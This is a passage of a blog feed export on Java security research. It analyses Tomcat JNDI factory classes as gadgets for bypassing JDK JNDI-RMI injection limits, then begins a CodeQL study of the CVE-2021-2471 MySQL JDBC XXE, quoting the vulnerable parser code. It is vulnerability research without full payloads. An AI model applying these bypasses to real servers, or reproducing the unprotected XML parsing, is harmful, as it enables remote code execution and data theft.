&#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        String propName = ra.getType();</span><br><span class="line">        String value = (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">        Method method = forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory"><a href="#org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory"></a>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</h4><p>利用要求总结：</p><ol><li>如果有本地Gadgets，可以反序列化，鸡肋</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(<span class="keyword">final</span> Object refObj, <span class="keyword">final</span> Name name, <span class="keyword">final</span> Context context,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">final</span> Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// The spec says to return null if we can&#x27;t create an instance</span></span><br><span class="line">    <span class="comment">// of the reference</span></span><br><span class="line">    Object obj = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refObj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        <span class="keyword">final</span> Reference ref = (Reference) refObj;</span><br><span class="line">        <span class="keyword">if</span> (isCorrectClass(ref.getClassName())) &#123;</span><br><span class="line">            <span class="keyword">final</span> RefAddr refAddr = ref.get(<span class="string">&quot;instanceKey&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// object was bound to JNDI via Referenceable API.</span></span><br><span class="line">                obj = instanceMap.get(refAddr.getContent());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Tomcat JNDI creates a Reference out of server.xml</span></span><br><span class="line">                <span class="comment">// &lt;ResourceParam&gt; configuration and passes it to an</span></span><br><span class="line">                <span class="comment">// instance of the factory given in server.xml.</span></span><br><span class="line">                String key = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    key = name.toString();</span><br><span class="line">                    obj = instanceMap.get(key);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> InstanceKeyDataSource ds = getNewInstance(ref);</span><br><span class="line">                    setCommonProperties(ref, ds);</span><br><span class="line">                    obj = ds;</span><br><span class="line">                    <span class="keyword">if</span> (key != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        instanceMap.put(key, ds);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setCommonProperties</span><span class="params">(<span class="keyword">final</span> Reference ref, <span class="keyword">final</span> InstanceKeyDataSource ikds)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    RefAddr refAddr = ref.get(<span class="string">&quot;dataSourceName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDataSourceName(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;description&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDescription(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized = (<span class="keyword">byte</span>[]) refAddr.getContent();</span><br><span class="line">        ikds.setJndiEnvironment((Properties) deserialize(serialized));</span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(data));</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException ex) &#123;</span><br><span class="line">                <span class="comment">// ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory"><a href="#org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory" class="headerlink" title="org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"></a>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</h4><p>利用要求总结：</p><ol><li>需要有无参构造函数</li><li>可以调用set*方法，要求方法的参数为1个，类型为String/Int/Long/Boolean/InetAddress</li><li>以上方法都要求public<br>不如BeanFactory，鸡肋</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    Enumeration&lt;RefAddr&gt; refs = ref.getAll();</span><br><span class="line">    String type = ref.getClassName();</span><br><span class="line">    Object o =</span><br><span class="line">        ClassLoaderUtil.loadClass(</span><br><span class="line">            type,</span><br><span class="line">            GenericNamingResourcesFactory.class.getClassLoader(),</span><br><span class="line">            Thread.currentThread().getContextClassLoader()).getConstructor().newInstance();</span><br><span class="line">    <span class="keyword">while</span> (refs.hasMoreElements()) &#123;</span><br><span class="line">        RefAddr addr = refs.nextElement();</span><br><span class="line">        String param = addr.getType();</span><br><span class="line">        String value = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr.getContent()!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            value = addr.getContent().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProperty(o, param, value)) &#123;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Property not configured[&quot;</span>+param+<span class="string">&quot;]. No setter found on[&quot;</span>+o+<span class="string">&quot;].&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-pool-DataSourceFactory"><a href="#org-apache-tomcat-jdbc-pool-DataSourceFactory" class="headerlink" title="org.apache.tomcat.jdbc.pool.DataSourceFactory"></a>org.apache.tomcat.jdbc.pool.DataSourceFactory</h4><p>利用要求总结：</p><ol><li>如果在rmi有限制url的情况，可以转jndi-ldap进行攻击</li></ol><p>不如BeanFactory，鸡肋</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// We only know how to deal with &lt;code&gt;javax.naming.Reference&lt;/code&gt;s</span></span><br><span class="line">    <span class="comment">// that specify a class name of &quot;javax.sql.DataSource&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    <span class="keyword">boolean</span> XA = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> ok = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.DataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.XADataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">        XA = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (org.apache.tomcat.jdbc.pool.DataSource.class.getName().equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">        log.warn(ref.getClassName()+<span class="string">&quot; is not a valid class name/type for this JNDI factory.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ALL_PROPERTIES.length; i++) &#123;</span><br><span class="line">        String propertyName = ALL_PROPERTIES[i];</span><br><span class="line">        RefAddr ra = ref.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String propertyValue = ra.getContent().toString();</span><br><span class="line">            properties.setProperty(propertyName, propertyValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,nameCtx,XA);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,<span class="keyword">null</span>,<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties,Context context, <span class="keyword">boolean</span> XA)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    PoolConfiguration poolProperties = DataSourceFactory.parsePoolProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (poolProperties.getDataSourceJNDI()!=<span class="keyword">null</span> &amp;&amp; poolProperties.getDataSource()==<span class="keyword">null</span>) &#123;</span><br><span class="line">        performJNDILookup(context, poolProperties);</span><br><span class="line">    &#125;</span><br><span class="line">    org.apache.tomcat.jdbc.pool.DataSource dataSource = XA?</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.XADataSource(poolProperties) :</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.DataSource(poolProperties);</span><br><span class="line">    <span class="comment">//initialise the pool itself</span></span><br><span class="line">    dataSource.createPool();</span><br><span class="line">    <span class="comment">// Return the configured DataSource instance</span></span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="javax-el-ELProcessor-的定位"><a href="#javax-el-ELProcessor-的定位" class="headerlink" title="javax.el.ELProcessor 的定位"></a>javax.el.ELProcessor 的定位</h3><p>这个只能归结为经验吧，原生jdk里能够命令执行的sink毕竟不多。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>如果是bind触发，有没有什么不一样?</li><li>Weblogic/jboss/Websphere 等其他web容器上呢，是否也有类似的Factory？</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文首先介绍了一些已知的知识点：</p><ol><li>JNDI-RMI 低版本注入的逻辑</li><li>JNDI-RMI 高版本注入的限制：decodeObject 限制了Reference 类，以及Tomcat EL 绕过的方式</li></ol><p>在此基础上，本文尝试回溯EL 绕过方式的发现思路</p><ol><li>首先寻找能够突破decodeObject 限制的Reference 子类</li><li>寻找能够利用的Factory</li></ol><p>最终成功回溯出了EL 绕过方式，以及一些其他的鸡肋姿势，颇有收获。</p><p>@20220318</p><p>膜一个浅蓝师傅，在BeanFactory 的利用上找到了除EL 之外的多个sink，还有MemoryUserDatabaseFactory、BasicDataSourceFactory 等几个其他的Factory，功力深厚，膜一个。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1]<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用 (by: KINGX)</a></li><li>[2]<a href="https://tttang.com/archive/1405/#comment-12212">探索高版本 JDK 下 JNDI 漏洞的利用方法(by: 浅蓝)</a></li></ul><!-- ## 其他#### 关于RegistryContext#bind 的攻击以上是RegistryContext#lookup 攻击com.sun.jndi.rmi.registry.RegistryContext 能bind 哪些类？<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(Name var1, Object var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidNameException(<span class="string">&quot;RegistryContext: Cannot bind empty name&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.registry.bind(var1.get(<span class="number">0</span>), <span class="keyword">this</span>.encodeObject(var2, var1.getPrefix(<span class="number">1</span>)));</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Remote <span class="title">encodeObject</span><span class="params">(Object var1, Name var2)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        var1 = NamingManager.getStateToBind(var1, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Remote)var1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper((Reference)var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper(((Referenceable)var1).getReference());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;RegistryContext: object to bind must be Remote, Reference, or Referenceable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以，能够bind的有</p><ul><li>Remote</li><li>Reference</li><li>Referenceable</li></ul><p>–&gt;</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/pasted-203.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面的JNDI 注入的JDK 版本限制已经耳熟能详了，针对JNDI-RMI 的tomcat EL 绕过姿势也被经常提起，本文尝试回溯这一姿势的发现过程。&lt;/p&gt;
&lt;h2 id=&quot;JNDI-RMI-注入&quot;&gt;&lt;a href=&quot;#JNDI-RMI-注入&quot; class=&quot;headerlink&quot; title=&quot;JNDI-RMI 注入&quot;&gt;&lt;/a&gt;JNDI-RMI 注入&lt;/h2&gt;&lt;h3 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h3&gt;&lt;p&gt;必须了解两个重要的类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;com.sun.jndi.rmi.registry.RegistryContext： JNDI-RMI接口&lt;/li&gt;
&lt;li&gt;java.rmi.registry.Registry： RMI 接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通常攻击场景下，Registry是作为RMI服务端，RegistryContext是作为攻击的client端，也就是vuln。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="http://m0d9.me/tags/JNDI/"/>
    
    <category term="RMI" scheme="http://m0d9.me/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL with CVE-2021-2471</title>
    <link href="http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/"/>
    <id>http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/</id>
    <published>2021-11-01T13:19:00.000Z</published>
    <updated>2021-11-12T08:34:13.369Z</updated>
    
    <content type="html"><![CDATA[<p>pyn3rd师傅的《Make JDBC Attack Brilliant Again》中有一个0day是mysql jdbc xxe，thread3am师傅也早就复现出来了，而且还发现了h2的xxe。膜一个，师傅们都太🐂🍺了。很多师傅们也复现了，再讲也没啥意思了，用CodeQL整点新的吧。</p><ol><li><p>CVE-2021-2471 mysql jdbc xxe在HITB ppt里面，没有讲DOMSource XXE这一部分，原因应该是pyn3rd师傅提漏洞还未公开，没写在ppt里面。所以这个洞有两个东西：</p><p> a. DOMSource XXE, 影响所有版本，官方8.0.27中修复掉了</p><p> b. Fabric XXE, 影响5.x, 在5.1.49中修复</p></li><li><p>CodeQL CWE-611有XXE的检测poc，不过source源不支持mysql。</p></li></ol><h2 id="CVE-2021-2471"><a href="#CVE-2021-2471" class="headerlink" title="CVE-2021-2471"></a>CVE-2021-2471</h2><h3 id="DOMSource-XXE"><a href="#DOMSource-XXE" class="headerlink" title="DOMSource XXE"></a>DOMSource XXE</h3><p>漏洞代码在 com.mysql.cj.jdbc.MysqlSQLXML#getSource</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Source&gt; <span class="function">T <span class="title">getSource</span><span class="params">(Class&lt;T&gt; clazz)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    checkClosed();</span><br><span class="line">    checkWorkingWithResult();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note that we try and use streams here wherever possible for the day that the server actually supports streaming from server -&gt; client</span></span><br><span class="line">    <span class="comment">// (futureproofing)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span> || clazz.equals(SAXSource.class)) &#123;</span><br><span class="line"></span><br><span class="line">        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> SAXSource(inputSource);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(DOMSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">            builderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder builder = builderFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">            InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> DOMSource(builder.parse(inputSource));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(t.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, t, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StreamSource.class)) &#123;</span><br><span class="line">        Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> StreamSource(reader);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StAXSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> StAXSource(<span class="keyword">this</span>.inputFactory.createXMLStreamReader(reader));</span><br><span class="line">     